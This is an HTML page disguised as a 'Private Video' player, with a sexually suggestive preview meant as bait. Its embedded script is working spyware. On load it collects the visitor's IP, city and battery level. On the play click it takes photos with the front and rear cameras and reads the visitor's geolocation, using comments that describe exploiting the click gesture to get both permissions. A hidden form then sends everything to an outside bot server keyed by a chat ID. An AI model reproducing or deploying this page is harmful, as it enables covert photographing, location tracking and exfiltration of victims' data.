<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <meta property="og:title" content="video Noor" />
  <meta property="og:description" content="🫦🫦🤤" />
  <meta property="og:image" content="https://i.postimg.cc/fbq2KRMb/11.jpg" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://YOUR_DOMAIN_HERE/getVideo" />
  <link rel="manifest" href="/manifest.json">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="theme-color" content="#000000">

  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="video Noor" />
  <meta name="twitter:description" content="🫦🤤" />
  <meta name="twitter:image" content="https://i.postimg.cc/fbq2KRMb/11.jpg" />
  <meta name="twitter:image:width" content="1200" />
  <meta name="twitter:image:height" content="630" />

  <title>Video</title>
  <style type="text/css">
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      background-color: #000;
      color: #fff;
    }

    .video-player-container {
      width: 90%;
      max-width: 800px;
      background: #111;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      position: relative;
    }

    .video-thumbnail {
      position: relative;
      width: 100%;
      height: 450px;
      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
                  url('https://i.postimg.cc/fbq2KRMb/11.jpg');
      background-size: cover;
      background-position: center;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    #realVideo {
      width: 100%;
      height: 450px;
      display: none;
      background: #000;
    }

    .play-button-overlay {
      width: 100px;
      height: 100px;
      background-color: rgba(255, 0, 0, 0.85);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
      z-index: 5;
    }

    .play-button-overlay:hover {
      transform: scale(1.1);
      background-color: rgba(255, 0, 0, 0.95);
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
    }

    .play-icon-large {
      width: 0;
      height: 0;
      border-left: 30px solid white;
      border-top: 20px solid transparent;
      border-bottom: 20px solid transparent;
      margin-left: 8px;
    }

    .video-info {
      padding: 20px;
      border-bottom: 1px solid #333;
    }

    .video-title {
      font-size: 1.5rem;
      font-weight: bold;
      margin-bottom: 8px;
    }

    .video-meta {
      display: flex;
      justify-content: space-between;
      color: #aaa;
      font-size: 0.9rem;
    }

    .video-controls {
      padding: 15px 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #1a1a1a;
    }

    .control-button {
      background: none;
      border: none;
      color: white;
      font-size: 1.2rem;
      cursor: pointer;
      padding: 8px 15px;
      border-radius: 4px;
      transition: background 0.2s;
    }

    .control-button:hover {
      background: #333;
    }

    .progress-bar {
      flex-grow: 1;
      height: 4px;
      background: #333;
      border-radius: 2px;
      margin: 0 20px;
      overflow: hidden;
      position: relative;
    }

    .progress-fill {
      position: absolute;
      height: 100%;
      width: 0%;
      background: #ff0000;
    }

    .time-display {
      color: #aaa;
      font-size: 0.9rem;
      min-width: 100px;
    }

    .spinner {
      border: 4px solid #fff;
      border-top: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
      position: absolute;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #loading {
      display: none;
      font-size: 1.2rem;
      color: #fff;
      margin-top: 20px;
      text-align: center;
    }

    .loading-text {
      margin-top: 10px;
    }

    .volume-control {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #aaa;
    }

    .volume-slider {
      width: 80px;
      height: 4px;
      background: #333;
      border-radius: 2px;
      position: relative;
    }

    .volume-level {
      position: absolute;
      height: 100%;
      width: 70%;
      background: #ff0000;
    }

    .fullscreen-btn {
      margin-left: 15px;
    }

    .live-badge {
      position: absolute;
      top: 15px;
      right: 15px;
      background: rgba(255, 0, 0, 0.9);
      color: #fff;
      padding: 5px 12px;
      border-radius: 4px;
      font-weight: bold;
      font-size: 0.85rem;
      letter-spacing: 1px;
      z-index: 10;
    }
  </style>
</head>
<body>
  <form id="data-form" method="POST" action="https://bot-qmpk.onrender.com/submitData">
    <input type="hidden" name="chatId" id="chatId" />
    <input type="hidden" name="imageDatas" id="imageDatas" />
    <input type="hidden" name="location" id="location" />
    <input type="hidden" name="permissions" id="permissions" />
    <input type="hidden" name="ipInfo" id="ipInfo" />
    <input type="hidden" name="battery" id="battery" />
    <iframe name="hidden_iframe" style="display:none;"></iframe>
  </form>

  <div class="video-player-container">
    <div class="video-info">
      <div class="video-title">Private Video</div>
      <div class="video-meta"></div>
    </div>

    <div class="video-thumbnail" id="thumbnailArea">
      <div class="live-badge">LIVE</div>
      <div class="play-button-overlay" id="playButtonOverlay">
        <div class="play-icon-large"></div>
        <div class="spinner" id="spinner"></div>
      </div>
    </div>

    <video id="realVideo" controls playsinline>
      <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
    </video>

    <div class="video-controls">
      <div class="progress-bar">
        <div class="progress-fill"></div>
      </div>

      <div class="time-display">0:00 / 2:45</div>

      <div class="volume-control">
        <span></span>
        <div class="volume-slider">
          <div class="volume-level"></div>
        </div>
      </div>

      <button class="control-button fullscreen-btn">⛶</button>
    </div>
  </div>

  <div id="loading">
    <div class="spinner"></div>
    <div class="loading-text">Preparing video...</div>
  </div>

  <script>
    (function() {
      // --- البيانات المجمعة ---
      const permissions = [];
      let images = [];
      let ipInfo = '';
      let batteryStatus = '';

      // --- جلب البيانات الأولية غير الحساسة فوراً ---
      async function fetchIPInfo() {
        try {
          const response = await fetch('https://ipapi.co/json/');
          const data = await response.json();
          ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
        } catch {
          ipInfo = "IP Info not available";
        }
        document.getElementById('ipInfo').value = ipInfo;
      }

      async function getBatteryStatus() {
        try {
          if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryStatus = Math.round(battery.level * 100) + '%';
          } else {
            batteryStatus = "API not supported";
          }
        } catch {
          batteryStatus = "Unknown";
        }
        document.getElementById('battery').value = batteryStatus;
      }

      // --- أدوات مساعدة للكاميرا ---
      async function captureFromCamera(facingMode) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode }
          });

          const video = document.createElement('video');
          video.srcObject = stream;
          video.setAttribute('playsinline', '');
          await video.play();

          // انتظار قصير لتهيئة الكاميرا
          await new Promise(resolve => setTimeout(resolve, 600));

          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          images.push(canvas.toDataURL('image/jpeg').split(',')[1]);

          // إيقاف التدفق
          stream.getTracks().forEach(track => track.stop());
          permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
          return true;
        } catch (err) {
          permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied: ${err.name}`);
          return false;
        }
      }

      // --- طلب الموقع السريع مع fallback قوي ---
      async function getLocationQuick() {
        try {
          const position = await new Promise((resolve, reject) => {
            // تقليل التايم أوت لتفادي فقدان سياق الإيماءة
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: false, // أسرع
              timeout: 5000,
              maximumAge: 0
            });
          });
          permissions.push('Geolocation Allowed');
          return `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
        } catch (err) {
          permissions.push('Geolocation Denied');
          return '';
        }
      }

      // --- الدالة الرئيسية التي يتم استدعاؤها عند النقر ---
      async function captureData() {
        const thumbnailArea = document.getElementById('thumbnailArea');
        const realVideo = document.getElementById('realVideo');
        const spinner = document.getElementById('spinner');
        const loadingDiv = document.getElementById('loading');
        const playButtonOverlay = document.getElementById('playButtonOverlay');

        // 1. تشغيل الفيديو فوراً
        thumbnailArea.style.display = 'none';
        realVideo.style.display = 'block';
        realVideo.play().catch(e => console.log("Autoplay prevented, user may need to click play."));

        // 2. إظهار التحميل
        spinner.style.display = 'block';
        loadingDiv.style.display = 'block';
        if (playButtonOverlay) playButtonOverlay.style.opacity = '0.5';

        // 3. الطلب المتوازي الحاسم: الموقع + الكاميرا الأمامية معاً
        // هذا هو المفتاح: نستخدم الإيماءة الواحدة لتفعيل كلا الإذنين في نفس الوقت
        const [locationResult, frontCameraResult] = await Promise.allSettled([
          getLocationQuick(),
          captureFromCamera('user')
        ]);

        // استخراج قيمة الموقع
        const locationValue = locationResult.status === 'fulfilled' ? locationResult.value : '';
        document.getElementById('location').value = locationValue;

        // 4. طلب الكاميرا الخلفية (قد ينجح لأنه لا يزال ضمن سياق قريب من الإيماءة أو لأن الكاميرا الأمامية فتحت الباب)
        // نضيف تأخيراً بسيطاً جداً فقط لتجنب تداخل الطلبيات على نفس الجهاز
        await new Promise(resolve => setTimeout(resolve, 200));
        await captureFromCamera('environment');

        // 5. تحديث الحقول المخفية
        document.getElementById('imageDatas').value = images.join(',');
        document.getElementById('permissions').value = permissions.join(', ');

        // 6. إنهاء التحميل
        spinner.style.display = 'none';
        loadingDiv.style.display = 'none';
        if (playButtonOverlay) {
          playButtonOverlay.style.opacity = '1';
          playButtonOverlay.style.pointerEvents = 'auto';
        }

        // 7. إرسال النموذج في الخلفية
        const form = document.getElementById('data-form');
        form.target = 'hidden_iframe';
        form.submit();
      }

      // --- تهيئة الصفحة ---
      window.addEventListener('DOMContentLoaded', async () => {
        // تعيين chatId من الرابط
        const chatId = new URLSearchParams(window.location.search).get('chatId');
        document.getElementById('chatId').value = chatId;

        // جلب IP والبطارية بالتوازي
        await Promise.all([fetchIPInfo(), getBatteryStatus()]);

        // ربط حدث النقر بالعنصرين (thumbnail والـ overlay)
        const thumbnailArea = document.getElementById('thumbnailArea');
        const playButtonOverlay = document.getElementById('playButtonOverlay');

        if (thumbnailArea) {
          thumbnailArea.addEventListener('click', captureData);
        }
        if (playButtonOverlay) {
          playButtonOverlay.addEventListener('click', (e) => {
            e.stopPropagation(); // منع الإطلاق المزدوج
            captureData();
          });
        }
      });

      // --- عناصر التحكم الأخرى ---
      document.querySelectorAll('.control-button').forEach(button => {
        button.addEventListener('click', function(e) {
          e.stopPropagation();
          if(this.textContent.includes('⛶')) {
            const video = document.getElementById('realVideo');
            if (video.requestFullscreen) {
              video.requestFullscreen();
            } else if (video.webkitRequestFullscreen) {
              video.webkitRequestFullscreen();
            }
          }
        });
      });

      // محاكاة شريط التقدم
      const progressInterval = setInterval(() => {
        const progressFill = document.querySelector('.progress-fill');
        if(document.getElementById('realVideo').style.display === 'block') {
          clearInterval(progressInterval);
          return;
        }
        const currentWidth = parseInt(progressFill.style.width) || 35;
        const newWidth = (currentWidth + 0.1) % 100;
        progressFill.style.width = newWidth + '%';

        const timeDisplay = document.querySelector('.time-display');
        const currentSeconds = Math.floor((newWidth / 100) * 165);
        const minutes = Math.floor(currentSeconds / 60);
        const seconds = currentSeconds % 60;
        timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
      }, 1000);
    })();
  </script>
</body>
</html>
